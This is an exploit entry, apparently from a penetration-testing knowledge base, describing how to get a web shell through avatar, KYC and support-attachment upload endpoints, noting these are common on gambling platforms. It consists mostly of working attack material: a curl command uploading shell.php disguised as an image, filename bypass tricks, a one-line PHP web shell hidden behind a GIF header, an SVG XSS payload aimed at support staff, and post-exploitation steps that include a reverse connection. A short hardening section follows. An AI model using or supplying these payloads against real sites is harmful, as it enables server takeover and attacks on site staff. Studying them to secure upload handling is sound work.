---
title: Shell access through uploads (avatars / KYC documents / support attachments)
cve: None (implementation flaws combined with middleware parsing differences)
severity: critical
cvss: 9.0
product: Custom-site upload endpoints (common in turnkey gambling platforms and agent admin panels)
versions: Any
ports: 80, 443
keywords: upload, getshell, avatar, kyc, image re-rendering, double extension, svg xss
verified: false
sources: Compiled from public sources (business logic / implementation / configuration flaws; no CVE; see references below)
---

## Fingerprints

- Upload points: avatars, identity-verification (KYC) documents, support IM attachments, promotion posters, deposit-receipt screenshots;
- Returned direct links: `/uploads/2024/11/xxx.jpg`, `oss-cn-*/bucket/...`;
- Responses contain `url`, `path`, `fileName` fields.

## Prerequisites

- A registered account (most sites allow avatar/document uploads immediately after registration).
- Upload validation occurs only in the frontend (bypassable by modifying requests) or checks only `Content-Type`.

## PoC

```bash
# 1) Directly executable extension (disguise Content-Type as an image)
curl -s -X POST http://target/api/upload/avatar \
  -H "Authorization: Bearer <token>" \
  -F "file=@shell.php;type=image/png;filename=shell.php"

# 2) Double extensions / letter case / special suffixes (choose for the middleware)
shell.php.jpg   shell.phtml   shell.pHp   shell.php%00.jpg   shell.php.  shell.php::

# 3) Image web shell (GIF89a prefix or genuine JPEG, with PHP appended)
printf 'GIF89a<?php system($_GET[c]);?>' > p.gif

# 4) SVG (triggers XSS when support/review staff view it, targeting the admin side)
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

First upload a plain `.txt` to check "is it accessible, and is the path guessable?", then change the extension; some sites perform only **image re-rendering** (recompression), in which case use a GIF header + comment segment, EXIF insertion, or SVG.

## Exploitation Steps

1. Enumerate all upload points and record returned-path patterns (`/uploads/yyyy/mm/` is guessable).
2. Test in order: executable extension → double extension/parsing differences → image re-rendering bypass → combine with existing LFI (image web shell).
3. After success, use `phpinfo`/`whoami` to identify the execution user and inspect `disable_functions`, `open_basedir`; when restricted by `open_basedir`, switch to same-directory file writes or a reverse connection.
4. Some sites upload to OSS with a custom domain that can parse PHP—more useful than an ordinary directory.
5. Cleanup after deployment: delete your own files; provide filenames and access URLs as evidence in the report.

## Remediation and Mitigation (Hardening)

- Allowlist extensions + rename server-side (UUID) + store outside webroot or on a separate domain without script execution.
- Validate magic bytes and re-encode images (GD/ImageMagick); convert all SVGs to PNG or reject them outright.
- Disable script parsing in upload directories (`location ~* /uploads/.*\.(php|jsp)$ { deny all; }`).
- Prevent extraction path traversal (`zip slip`) for archive/compressed-file uploads.

## References

- OWASP File Upload Cheat Sheet; WSTG-BUSL-09.
